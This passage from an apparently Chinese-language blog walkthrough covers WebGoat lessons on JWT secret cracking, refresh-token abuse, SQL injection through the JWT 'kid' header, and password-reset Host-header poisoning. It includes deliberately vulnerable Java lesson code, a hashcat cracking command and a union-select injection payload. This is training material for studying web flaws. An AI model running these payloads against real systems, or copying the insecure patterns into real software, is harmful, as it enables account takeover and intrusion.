        }else {
            return failed(this).build();
        }

    }

    @GetMapping("/JWT/quiz")
    @ResponseBody
    public boolean[] getResults(){
        return this.guesses;
    }
}
```

这里是问我们下面两段程序都会出现什么现象

重点就在下面的两个函数上面 我们先去看一下源文档

![image-20220912184414021](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912184414021.png)

这里只能解密带密钥的jwt 

![image-20220912184550440](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912184550440.png)

这里两个都可以 答案就很明显了

![image-20220912184611212](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912184611212.png)

![image-20220912184637729](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912184637729.png)

### JWTSecretKeyEndpoint

```java
package com.wanan.webgoat.lessons.jwt;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jwt;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import io.jsonwebtoken.impl.TextCodec;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;

import java.sql.Date;
import java.time.Instant;
import java.util.Calendar;
import java.util.List;
import java.util.Random;

@RestController
@AssignmentHints({"jwt-secret-hint1", "jwt-secret-hint2", "jwt-secret-hint3"})
public class JWTSecretKeyEndpoint extends AssignmentEndpoint {
    public static final String[] SECRETS = {"victory","business","available","shipping","washington"};
    public static final String JWT_SECRET = TextCodec.BASE64.encode(SECRETS[new Random().nextInt(SECRETS.length)]);
    private static final String WEBGOAT_USER = "WebGoat";
    private static final List<String> expectedClaims = List.of("iss","iat","exp","aud","sub","username","Email","Role");

    @RequestMapping(path = "/JWT/secret/gettoken",produces = MediaType.TEXT_HTML_VALUE)
    @ResponseBody
    public String getSecretToken(){
        return Jwts.builder()
                .setIssuer("WebGoat Token Builder")
                .setAudience("webgoat.org")
                .setIssuedAt(Calendar.getInstance().getTime())
                .setExpiration(Date.from(Instant.now().plusSeconds(60)))
                .setSubject("tom@webgoat.org")
                .claim("username","Tom")
                .claim("Email","tom@webgoat.org")
                .claim("Role",new String[]{"Manager","Project Administrator"})
                .signWith(SignatureAlgorithm.HS256,JWT_SECRET).compact();
    }
    @PostMapping("/JWT/secret")
    @ResponseBody
    public AttackResult login(@RequestParam String token){
        try {
            Jwt jwt = Jwts.parser().setSigningKey(JWT_SECRET).parseClaimsJws(token);
            Claims claims = (Claims) jwt.getBody();
            if (!claims.keySet().containsAll(expectedClaims)){
                return failed(this).feedback("jwt-secret-claims-missing").build();
            }else {
                String user = (String) claims.get("username");
                if (WEBGOAT_USER.equalsIgnoreCase(user)){
                    return success(this).build();
                }else {
                    return failed(this).feedback("jwt-secret-incorrect-user").feedbackArgs(user).build();
                }
            }
        }catch (Exception e){
            return failed(this).feedback("jwt-invalid-token").output(e.getMessage()).build();
        }
    }

}
```

```
eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY2Mjk3OTMwMiwiZXhwIjoxNjYyOTc5MzYyLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.OX3gLBVv0LUp1i59G4sz13o-KSgWHU1es1ddcefA4pU
```

这里使用字典爆破

```
hashcat token.txt -m 16500 -a 3 -w 3  /root/c-jwt-cracker/google-10000-english/google-10000-english.txt
```

![image-20220912184940360](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912184940360.png)

这里需要注意的是失效的时间

![image-20220912185143775](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912185143775.png)

![image-20220912185200310](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912185200310.png)

### JWTRefreshEndpoint

```java
package com.wanan.webgoat.lessons.jwt;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import io.jsonwebtoken.*;
import org.apache.commons.lang3.RandomStringUtils;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.util.*;
import java.util.concurrent.TimeUnit;

import static org.springframework.http.ResponseEntity.ok;

@RestController
@AssignmentHints({"jwt-refresh-hint1", "jwt-refresh-hint2", "jwt-refresh-hint3", "jwt-refresh-hint4"})
public class JWTRefreshEndpoint extends AssignmentEndpoint {
    public static final String PASSWORD = "bm5nhSkxCXZkKRy4";
    private static final String JWT_PASSWORD = "bm5n3SkxCX4kKRy4";
    private static final List<String > validRefreshTokens = new ArrayList<>();

    @PostMapping(value = "/JWT/refresh/login", consumes = MediaType.APPLICATION_JSON_VALUE, produces = MediaType.APPLICATION_JSON_VALUE)
    @ResponseBody
    public ResponseEntity follow(@RequestBody(required = false) Map<String, Object> json) {
        if (json == null) {
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
        }
        String user = (String) json.get("user");
        String password = (String) json.get("password");

        if ("Jerry".equalsIgnoreCase(user) && PASSWORD.equals(password)) {
//            如果用户名和密码都相同 为Jerry
            return ok(createNewTokens(user));
//            就创建一个新用户
        }
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
    }

    private Map<String ,Object> createNewTokens(String user) {
        Map<String ,Object> claims = new HashMap<>();
        claims.put("admin","false");
//        非admin
        claims.put("user",user);
        String token = Jwts.builder()
                .setIssuedAt(new Date(System.currentTimeMillis() + TimeUnit.DAYS.toDays(10)))
                .setClaims(claims)
                .signWith(SignatureAlgorithm.HS512,JWT_PASSWORD)
                .compact();
//        首先明确这里的 token 其实是 jwt中的
        Map<String ,Object> tokenJson = new HashMap<>();
//        这里的json其实是返回回去给人看的
        String refreshToken = RandomStringUtils.randomAlphabetic(20);
//        这里是生成了一个随机字母
        validRefreshTokens.add(refreshToken);
        tokenJson.put("access_token",token);
        tokenJson.put("refresh_token",refreshToken);
//        这里的
        return tokenJson;

    }

    @PostMapping("/JWT/refresh/checkout")
    @ResponseBody
    public ResponseEntity<AttackResult> checkout(@RequestHeader(value = "Authorization",required = false)String token){
        if (token == null){
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
        }
        try {
            Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(token.replace("Bearer ",""));
//            检查是否是tom
            Claims claims = (Claims) jwt.getBody();
            String user = (String) claims.get("user");
            if ("Tom".equals(user)){
                return ok(success(this).build());
            }
            return ok(failed(this).feedback("jwt-refresh-not-tom").feedbackArgs(user).build());

        }catch (ExpiredJwtException e){
            return ok(failed(this).output(e.getMessage()).build());
        }catch (JwtException e){
            return ok(failed(this).feedback("jwt-invalid-token").build());
        }
    }
    @PostMapping("/JWT/refresh/newToken")
    @ResponseBody
    public ResponseEntity newToken(@RequestHeader(value = "Authorization",required = false)String token,
                                   @RequestBody(required = false) Map<String,Object> json){
        if (token == null || json == null){
//            这里是如果两个都没传的话
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
        }
        String user;
        String refreshToken;
        try {
//            这里我们假设token没传
            Jwt<Header,Claims> jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(token.replace("Bearer ",""));
//            这里当然会抛异常
            user = (String) jwt.getBody().get("user");
            refreshToken = (String) json.get("refresh_token");
        }catch (ExpiredJwtException e){
            user = (String) e.getClaims().get("user");
//            这里获取了user
            refreshToken = (String) json.get("refresh_token");
//            获取了refresh_token
        }
        if (user == null || refreshToken == null){
//            如果都不是空
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
        }else if (validRefreshTokens.contains(refreshToken)){
//            如果已经认证的 refreshToken 存在这个的话
            validRefreshTokens.remove(refreshToken);
//            首先移除了refreshToken
            return ok(createNewTokens(user));
//            接着创建了一个新用户的token
        }else {
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
        }
    }

}

```

问题就出现在这里 这里对refreshToken 的校验极小 导致仅仅存在就通过了 没有对绑定的用户做进一步确认 因此这里的user可以随我们控制进入

![image-20220912214902920](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912214902920.png)

但是呢 这道题目必须要读源码 这里有两个重点 一是日志文件 另一个是tom付费

![image-20220912214026064](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912214026064.png)

这里可以看到给的信息根本不够用

![image-20220912214104790](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912214104790.png)

这里的登录很明显 这个Jerry 的用户名和密码是已知的 而且既然让我们用tom去买书 那么我们应该有个账号吧

![image-20220912214441115](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912214441115.png)

因此这里的Jerry 用户名密码当做已知条件 接着就是参数问题了 首先后端接受的参数是json 那么我们必须发送json 注意Content-Type 而这里的参数名也比较好猜 user password 我们也当做已知

![image-20220912222956517](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912222956517.png)

这样我们就通过已知账号登录了 并获取了一个refresh_token

接着我们需要去请求newToken 这里也没有给出提示 当我们拿到了所有的值去访问的时候还是会出现认证不通过的情况是什么原因呢

![image-20220912223031789](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912223031789.png)

这里的jwt解析完成后其实使用的是Jerry

![image-20220912220723712](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912220723712.png)

也就是说我们需要一个tom的jwt来请求

![image-20220912220759305](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912220759305.png)

![image-20220912223055438](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912223055438.png)

成功获取到tom的token 买东西

![image-20220912223201628](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912223201628.png)

### JWTFinalEndpoint

```java
package com.wanan.webgoat.lessons.jwt;

import com.wanan.webgoat.container.LessonDataSource;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import io.jsonwebtoken.*;
import io.jsonwebtoken.impl.TextCodec;
import org.apache.commons.lang3.StringUtils;
import org.springframework.web.bind.annotation.*;

import java.sql.ResultSet;
import java.sql.SQLException;

@RestController
@AssignmentHints({"jwt-final-hint1", "jwt-final-hint2", "jwt-final-hint3", "jwt-final-hint4", "jwt-final-hint5", "jwt-final-hint6"})
public class JWTFinalEndpoint extends AssignmentEndpoint {
    private final LessonDataSource dataSource;


    public JWTFinalEndpoint(LessonDataSource dataSource) {
        this.dataSource = dataSource;
    }

    @PostMapping("/JWT/final/follow/{user}")
    @ResponseBody
    public String follow(@PathVariable("user")String user){
        if ("Jerry".equals(user)){
            return "Following yourself seems redundant";
        }else {
            return "You are now following Tom";
        }
    }
    @PostMapping("/JWT/final/delete")
    @ResponseBody
    public AttackResult resetVotes(@RequestParam("token") String token){
        if (StringUtils.isEmpty(token)){
            return failed(this).feedback("jwt-invalid-token").build();
        }else {
            try {
                final String[] errorMessage = {null};
                Jwt jwt = Jwts.parser().setSigningKeyResolver(new SigningKeyResolverAdapter() {
//                    这里相当于一个自定义的用户签名验证系统 SigningKeyResolverAdapter
                    @Override
                    public byte[] resolveSigningKeyBytes(JwsHeader header, Claims claims) {
                        final String kid = (String) header.get("kid");
//                        获取jwt 中的kid
                        try (var connection = dataSource.getConnection()) {
                            ResultSet rs = connection.createStatement().executeQuery("SELECT key FROM jwt_keys WHERE id = '" + kid + "'");
//                            执行sql语句这里很明显是存在sql注入的 也就是说这里的密钥其实是我们可以自己控制的
//                            比如这样SELECT key FROM jwt_keys WHERE id = 'webgoat_key' union select 'MQ==' from salaries --
//                            那么我们查询出来的密钥就是 这个MQ== 为啥base64 是因为后面有解密
                            while (rs.next()) {
                                return TextCodec.BASE64.decode(rs.getString(1));
                            }
                        } catch (SQLException e) {
                            errorMessage[0] = e.getMessage();
                        }
                        return null;
                    }
                }).parseClaimsJws(token);
//                这里是安全的
                if (errorMessage[0] != null){
                    return failed(this).output(errorMessage[0]).build();
                }
                Claims claims = (Claims) jwt.getBody();
                String username = (String) claims.get("username");
                if ("Jerry".equals(username)){
                    return failed(this).feedback("jwt-final-jerry-account").build();
                }
                if ("Tom".equals(username)){
                    return success(this).build();
                }else {
                    return failed(this).feedback("jwt-final-not-tom").build();
                }
            }catch (JwtException e){
                return failed(this).feedback("jwt-invalid-token").output(e.toString()).build();
            }
        }
    }
}

```

![image-20220913205353864](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220913205353864.png)

这里的sql语句中的from 其实是让sql语句顺利执行的 因为这里使用的是hsql

```
webgoat_key' union select 'MQ==' from salaries -- 
```

注意失效时间

![image-20220913210325154](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220913210325154.png)

![image-20220913210341503](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220913210341503.png)

## password_reset

### PasswordReset

```java
package com.wanan.webgoat.lessons.password_reset;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class PasswordReset extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.A7;
    }

    @Override
    public String getTitle() {
        return "password-reset.title";
    }
}
```

### SimpleMailAssignment

```java
package com.wanan.webgoat.lessons.password_reset;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.client.RestClientException;
import org.springframework.web.client.RestTemplate;

import java.time.LocalDateTime;

import static java.util.Optional.ofNullable;
@RestController
public class SimpleMailAssignment extends AssignmentEndpoint {

    private final String webWolfURL;
    private RestTemplate restTemplate;

    public SimpleMailAssignment(RestTemplate restTemplate, @Value("${webwolf.mail.url}") String webWolfURL) {
        this.restTemplate = restTemplate;
        this.webWolfURL = webWolfURL;
    }

    @PostMapping(path = "/PasswordReset/simple-mail", consumes = MediaType.APPLICATION_FORM_URLENCODED_VALUE)
    @ResponseBody
    public AttackResult login(@RequestParam String email, @RequestParam String password) {
        String emailAddress = ofNullable(email).orElse("unknown@webgoat.org");
        String username = extractUsername(emailAddress);

        if (username.equals(getWebSession().getUserName()) && StringUtils.reverse(username).equals(password)) {
            return success(this).build();
        } else {
            return failed(this).feedbackArgs("password-reset-simple.password_incorrect").build();
        }
    }

    @PostMapping(consumes = MediaType.APPLICATION_FORM_URLENCODED_VALUE, value = "/PasswordReset/simple-mail/reset")
    @ResponseBody
    public AttackResult resetPassword(@RequestParam String emailReset) {
        String email = ofNullable(emailReset).orElse("unknown@webgoat.org");
        return sendEmail(extractUsername(email), email);
    }

    private String extractUsername(String email) {
        int index = email.indexOf("@");
        return email.substring(0, index == -1 ? email.length() : index);
    }

    private AttackResult sendEmail(String username, String email) {
        if (username.equals(getWebSession().getUserName())) {
            PasswordResetEmail mailEvent = PasswordResetEmail.builder()
                    .recipient(username)
                    .title("Simple e-mail assignment")
                    .time(LocalDateTime.now())
                    .contents("Thanks for resetting your password, your new password is: " + StringUtils.reverse(username))
                    .sender("webgoat@owasp.org")
                    .build();
            try {
                restTemplate.postForEntity(webWolfURL, mailEvent, Object.class);
//                简单发送一个post请求
            } catch (RestClientException e) {
                return informationMessage(this).feedback("password-reset-simple.email_failed").output(e.getMessage()).build();
            }
            return informationMessage(this).feedback("password-reset-simple.email_send").feedbackArgs(email).build();
        } else {
            return informationMessage(this).feedback("password-reset-simple.email_mismatch").feedbackArgs(username).build();
        }
    }
}
```

### PasswordResetEmail

```java
package com.wanan.webgoat.lessons.password_reset;

import lombok.Builder;
import lombok.Data;

import java.io.Serializable;
import java.time.LocalDateTime;

@Builder
@Data
public class PasswordResetEmail implements Serializable {
//    可序列化
    private LocalDateTime time;
    private String contents;
    private String sender;
    private String title;
    private String recipient;
}
```

测试一下webwolf的email 是否通

![image-20220913223829802](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220913223829802.png)

前面用户名 @后面随意

![image-20220913223856909](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220913223856909.png)

![image-20220913224004082](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220913224004082.png)

接收到邮箱

![image-20220913224019486](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220913224019486.png)

登录即可过关

![image-20220913224052566](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220913224052566.png)

### QuestionsAssignment

```java
package com.wanan.webgoat.lessons.password_reset;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.util.HashMap;
import java.util.Map;

@RestController
public class QuestionsAssignment extends AssignmentEndpoint {
    private static final Map<String ,String > COLORS = new HashMap<>();
    static {
        COLORS.put("admin","green");
        COLORS.put("jerry","orange");
        COLORS.put("tom", "purple");
        COLORS.put("larry", "yellow");
        COLORS.put("webgoat", "red");
    }
    @PostMapping(path = "/PasswordReset/questions",consumes = MediaType.APPLICATION_FORM_URLENCODED_VALUE)
    @ResponseBody
    public AttackResult passwordReset(@RequestParam Map<String ,Object> json){
        String securityQuestion = (String) json.getOrDefault("securityQuestion","");
        String username = (String) json.getOrDefault("username","");
        if ("webgoat".equalsIgnoreCase(username.toLowerCase())){
            return failed(this).feedback("password-questions-wrong-user").build();
        }

        String validAnswer = COLORS.get(username.toLowerCase());
        if (validAnswer == null){
            return failed(this).feedback("password-questions-unknown-user").feedbackArgs(username).build();
        }else if (validAnswer.equals(securityQuestion)){
            return success(this).build();
        }
        return failed(this).build();

    }
}
```

![image-20220914104233197](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914104233197.png)

这里的意思是让我们爆破吗

这里不爆破了直接登了

![image-20220914104310434](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914104310434.png)

### SecurityQuestionAssignment

```java
package com.wanan.webgoat.lessons.password_reset;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import static java.util.Optional.of;
import java.util.HashMap;
import java.util.Map;

@RestController
public class SecurityQuestionAssignment extends AssignmentEndpoint {
    @Autowired
    private TriedQuestions triedQuestions;
    private  static Map<String ,String > questions;
    static {
        questions = new HashMap<>();
        questions.put("What is your favorite animal?", "The answer can easily be guessed and figured out through social media.");
        questions.put("In what year was your mother born?", "Can  be easily guessed.");
        questions.put("What was the time you were born?", "This may first seem like a good question, but you most likely dont know the exact time, so it might be hard to remember.");
        questions.put("What is the name of the person you first kissed?", "Can be figured out through social media, or even guessed by trying the most common names.");
        questions.put("What was the house number and street name you lived in as a child?", "Answer can be figured out through social media, or worse it might be your current address.");
        questions.put("In what town or city was your first full time job?", "In times of LinkedIn and Facebook, the answer can be figured out quite easily.");
        questions.put("In what city were you born?", "Easy to figure out through social media.");
        questions.put("What was the last name of your favorite teacher in grade three?", "Most people would probably not know the answer to that.");
        questions.put("What is the name of a college/job you applied to but didn't attend?", "It might not be easy to remember and an hacker could just try some company's/colleges in your area.");
        questions.put("What are the last 5 digits of your drivers license?", "Is subject to change, and the last digit of your driver license might follow a specific pattern. (For example your birthday).");
        questions.put("What was your childhood nickname?", "Not all people had a nickname.");
        questions.put("Who was your childhood hero?", "Most Heroes we had as a child where quite obvious ones, like Superman for example.");
        questions.put("On which wrist do you were your watch?", "There are only to possible real answers, so really easy to guess.");
        questions.put("What is your favorite color?", "Can easily be guessed.");
    }
    @PostMapping("/PasswordReset/SecurityQuestions")
    @ResponseBody
    public AttackResult completed(@RequestParam String question){
        var answer = of(questions.get(question));
        if (answer.isPresent()){
            triedQuestions.incr(question);
//            这个是看了问题添加进去
            if (triedQuestions.isCompleted()){
//                这个是计数 超过两个就过
                return success(this).output("<b>"+answer+"</b>").build();
            }
        }
        return informationMessage(this)
                .feedback("password-questions-one-successful")
                .output(answer.orElse("Unknown question, please try again"))
                .build();
    }
}
```

### TriedQuestions

```java
package com.wanan.webgoat.lessons.password_reset;

import org.springframework.stereotype.Component;
import org.springframework.web.context.annotation.SessionScope;

import java.util.HashSet;
import java.util.Set;

@Component
@SessionScope
public class TriedQuestions {
    private Set<String> answeredQuestions = new HashSet<>();

    public void incr(String question){
        answeredQuestions.add(question);
    }
    public boolean isCompleted(){
        return answeredQuestions.size() > 1;
    }
}
```

随便看两个问题就过关

![image-20220914105706860](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914105706860.png)

### ResetLinkAssignment

注意与原文的差异 对应均需要修改 

![image-20220914123421945](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914123421945.png)

![image-20220914123349453](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914123349453.png)

```java
package com.wanan.webgoat.lessons.password_reset;

import com.google.common.collect.Maps;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.lessons.password_reset.resetlink.PasswordChangeForm;
import org.springframework.ui.Model;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.servlet.ModelAndView;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

@RestController
@AssignmentHints({"password-reset-hint1", "password-reset-hint2", "password-reset-hint3", "password-reset-hint4", "password-reset-hint5", "password-reset-hint6"})
public class ResetLinkAssignment extends AssignmentEndpoint {
    static final String PASSWORD_TOM_9 = "somethingVeryRandomWhichNoOneWillEverTypeInAsPasswordForTom";
//    作为tom 的密码
    static final String TOM_EMAIL = "tom@webgoat-cloud.org";
//    tom 的邮箱
    static Map<String ,String > userToTomResetLink = new HashMap<>();
    static Map<String ,String > usersToTomPassword = Maps.newHashMap();
    static List<String> resetLinks = new ArrayList<>();
//    这里用于存放准备重置密码的连接

    static final String TEMPLATE = "Hi, you requested a password reset link, please use this "
            + "<a target='_blank' href='http://%s/WebGoat/PasswordReset/reset/reset-password/%s'>link</a> to reset your password."
            + "\n \n\n"
            + "If you did not request this password change you can ignore this message."
            + "\n"
            + "If you have any comments or questions, please do not hesitate to reach us at support@webgoat-cloud.org"
            + "\n\n"
            + "Kind regards, \nTeam WebGoat";

    @PostMapping("/PasswordReset/reset/login")
    @ResponseBody
    public AttackResult login(@RequestParam String password ,@RequestParam String email){
        if (TOM_EMAIL.equals(email)){
            String passwordTom = usersToTomPassword.getOrDefault(getWebSession().getUserName(),PASSWORD_TOM_9);
//            这里需要tom 的密码才能过关
            if (passwordTom.equals(PASSWORD_TOM_9)){
                return success(this).build();
            }
        }
        return failed(this).feedback("login_failed.tom").build();
    }
    @GetMapping("/PasswordReset/reset/reset-password/{link}")
    public ModelAndView resetPassword(@PathVariable(value = "link")String  link, Model model){
        ModelAndView modelAndView = new ModelAndView();
        if (ResetLinkAssignment.resetLinks.contains(link)){
//            如果存在这个重置密码的url
            PasswordChangeForm form = new PasswordChangeForm();
//            新建一个form表单对象
            form.setResetLink(link);
//            设置重置链接为link
            model.addAttribute("form",form);

            modelAndView.addObject("form",form);
//            添加进入这个表单对象
            modelAndView.setViewName("lessons/password_reset/templates/password_reset.html");
        }else {
            modelAndView.setViewName("lessons/password_reset/templates/password_link_not_found.html");

        }
        return modelAndView;
    }

    @GetMapping("/PasswordReset/reset/change-password")
    public ModelAndView illegalCall(){
        ModelAndView modelAndView = new ModelAndView();
        modelAndView.setViewName("lessons/password_reset/templates/password_link_not_found.html");
        return modelAndView;
    }
    @PostMapping("/PasswordReset/reset/change-password")
    public ModelAndView changePassword(@ModelAttribute("form") PasswordChangeForm form, BindingResult bindingResult){
        ModelAndView modelAndView = new ModelAndView();
        if (!org.springframework.util.StringUtils.hasText(form.getPassword())){
            bindingResult.rejectValue("password","not.empty");
        }
        if (bindingResult.hasErrors()){
            modelAndView.setViewName("lessons/password_reset/templates/password_reset.html");
            return modelAndView;
        }
        if (!resetLinks.contains(form.getResetLink())){
            modelAndView.setViewName("lessons/password_reset/templates/password_link_not_found.html");
            return modelAndView;
        }
        if (checkIfLinkIsFromTom(form.getResetLink())){
            usersToTomPassword.put(getWebSession().getUserName(),form.getPassword());
        }
        modelAndView.setViewName("lessons/password_reset/templates/success.html");
        return modelAndView;

    }

    private boolean checkIfLinkIsFromTom(String resetLinkFromForm) {
        String resetLink = userToTomResetLink.getOrDefault(getWebSession().getUserName(),"unknown");
        return resetLink.equals(resetLinkFromForm);
    }
}

```

### ResetLinkAssignmentForgotPassword

```java
package com.wanan.webgoat.lessons.password_reset;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpMethod;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.client.RestTemplate;
import org.springframework.http.HttpHeaders;
import javax.servlet.http.HttpServletRequest;
import java.util.UUID;

@RestController
public class ResetLinkAssignmentForgotPassword extends AssignmentEndpoint {
    private final RestTemplate restTemplate;
    private String webWolfHost;
    private String webWolfPort;
    private final String webWolfMailURL;

    public ResetLinkAssignmentForgotPassword(RestTemplate restTemplate, @Value("${webwolf.host}") String webWolfHost, @Value("${webwolf.port}") String webWolfPort, @Value("${webwolf.mail.url}") String webWolfMailURL) {
        this.restTemplate = restTemplate;
        this.webWolfHost = webWolfHost;
        this.webWolfPort = webWolfPort;
        this.webWolfMailURL = webWolfMailURL;
    }
    @PostMapping("/PasswordReset/ForgotPassword/create-password-reset-link")
    @ResponseBody
    public AttackResult sendPasswordResetLink(@RequestParam String email, HttpServletRequest request){
        String resetLink = UUID.randomUUID().toString();
//        这里先获取一个uuid 用于区分url
        ResetLinkAssignment.resetLinks.add(resetLink);
//        将链接存放进去
        String host = request.getHeader("host");
//        获取请求头的host
        if (ResetLinkAssignment.TOM_EMAIL.equals(email) && (host.contains(webWolfPort) || host.contains(webWolfHost))){
//            如果重置的是tom 的密码 并且host中包含webWolf
            ResetLinkAssignment.userToTomResetLink.put(getWebSession().getUserName(), resetLink);
//            那么就存放到tom的重置url中
            fakeClickingLinkEmail(host,resetLink);
//            这里是模拟tom去点击重置密码
        }else {
            try {
                sendMailToUser(email,host,resetLink);
//              发送邮件出去
            }catch (Exception e){
                return failed(this).output("E-mail can't be send. please try again.").build();
            }
        }
        return success(this).feedback("email.send").feedbackArgs(email).build();
    }

    private void sendMailToUser(String email, String host, String resetLink) {
        int index = email.indexOf("@");
        String username = email.substring(0,index == -1 ? email.length(): index);
        PasswordResetEmail mail = PasswordResetEmail.builder()
                .title("Your password reset link")
                .contents(String.format(ResetLinkAssignment.TEMPLATE,host,resetLink))
                .sender("password-reset@webgoat-cloud.net")
                .recipient(username).build();
        this.restTemplate.postForEntity(webWolfMailURL,mail,Object.class);
    }

    private void fakeClickingLinkEmail(String host, String resetLink) {
        try {
            HttpHeaders httpHeaders = new HttpHeaders();
            HttpEntity httpEntity = new HttpEntity(httpHeaders);
            new RestTemplate().exchange(String.format("http://%s/PasswordReset/reset/reset-password/%s",host,resetLink), HttpMethod.GET,httpEntity,Void.class);
//            这里是模拟tom去点击重置密码
        }catch (Exception e){

        }
    }
}

```

### resetlink

#### PasswordChangeForm

```java
package com.wanan.webgoat.lessons.password_reset.resetlink;

import lombok.Getter;
import lombok.Setter;

import javax.validation.constraints.NotNull;
import javax.validation.constraints.Size;

@Getter
@Setter
public class PasswordChangeForm {
    @NotNull
    @Size(min = 6,max =10)
    private String password;
    private String resetLink;
}
```

![image-20220914155825580](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914155825580.png)

发送邮件这里可以看到取的是请求头中的host去发送的

![image-20220914155911808](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914155911808.png)

这里的host跟踪下发现到了 这里

![image-20220914160122835](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914160122835.png)

![image-20220914160138495](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914160138495.png)

也就是说拼接到了邮件里面去了 还需要注意的是 这里的拼接附带着uuid 也就是说 如果我们拿到这个uuid自然就可以重置别人的密码

这里我们可以跟着走一遍就知道什么原因了 抓一下下面的包

![image-20220914160426747](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914160426747.png)

更改host为webwolf

